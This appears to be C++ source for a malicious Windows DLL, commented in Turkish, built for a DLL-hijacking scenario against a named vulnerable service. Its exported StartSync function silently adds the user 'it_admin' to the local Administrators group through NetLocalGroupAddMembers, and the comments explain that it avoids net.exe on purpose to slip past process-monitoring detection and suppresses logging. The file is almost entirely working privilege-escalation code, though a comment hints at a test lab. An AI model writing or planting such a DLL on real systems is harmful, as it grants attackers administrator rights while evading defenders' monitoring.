#include <windows.h>
#include <lm.h> // NetLocalGroupAddMembers ve ilgili yapılar için
#include <tchar.h>
#include <string>

#pragma comment(lib, "netapi32.lib") // Bu kütüphanenin bağlanması gerekir

// --- GİZLİLİK (STEALTH) VE YETKİ YÜKSELTME ---
// Komut satırı araçları (net.exe) KULLANILMAZ.
// Doğrudan Windows API'si ile işlem yapılır. Bu, süreç izleme (process monitoring)
// tabanlı tespitlerden (örn. Sysmon Olay Kimliği 1/4688) kaçınmayı sağlar.

void ExecuteStealthPayload() {
    // 1. Hedef Kullanıcı Adı
    // Senaryoda ele geçirilen kullanıcının adı (Geniş karakter - Unicode)
    // LÜTFEN KENDİ TEST KULLANICI ADINIZLA DEĞİŞTİRİN
    LPCWSTR targetUser = L"it_admin"; 
    
    // 2. Hedef Grup Adı (Yerel Yönetici Grubu)
    // İngilizce sistemler için "Administrators", Türkçe için "Yöneticiler" olabilir.
    // Güvenlik Tanımlayıcısı (SID) kullanmak daha evrenseldir ancak bu örnekte isim kullanıyoruz.
    LPCWSTR targetGroup = L"Administrators";

    // 3. API İçin Yapıların (Struct) Hazırlanması
    LOCALGROUP_MEMBERS_INFO_3 memberInfo;
    memberInfo.lgrmi3_domainandname = (LPWSTR)targetUser;

    // 4. API Çağrısı: Kullanıcıyı Gruba Ekleme
    // NetLocalGroupAddMembers, doğrudan Yerel Güvenlik Yetkilisi (LSA) ile konuşur.
    NET_API_STATUS status = NetLocalGroupAddMembers(
        NULL,           // Yerel bilgisayar
        targetGroup,    // Eklenecek grup ("Administrators")
        3,              // Bilgi seviyesi (3: domain/isim yapısı)
        (LPBYTE)&memberInfo, // Eklenecek kullanıcı bilgisi
        1               // Eklenecek üye sayısı
    );

    // Başarı veya başarısızlık durumu kontrol edilebilir, 
    // ancak DLL hijacking senaryosunda genellikle loglama istenmez (sessizlik).
    /*
    if (status == NERR_Success) {
        // Başarılı (Local Admin oldun!)
    } else {
        // Hata
    }
    */
}

// --- HEDEF SERVİSİN BEKLEDİĞİ FONKSİYON (EXPORT) ---
// Zafiyetli servisimiz (EuroSky_InventorySync.exe) bu fonksiyonu arayacak.
extern "C" __declspec(dllexport) void StartSync() {
    // Servis bu fonksiyonu çağırdığında gizli payload tetiklenir.
    ExecuteStealthPayload();
}

// --- DLL GİRİŞ NOKTASI (DLLMAIN) ---
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Loader Lock sorununu önlemek için DllMain içi boş tutulur.
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; 
}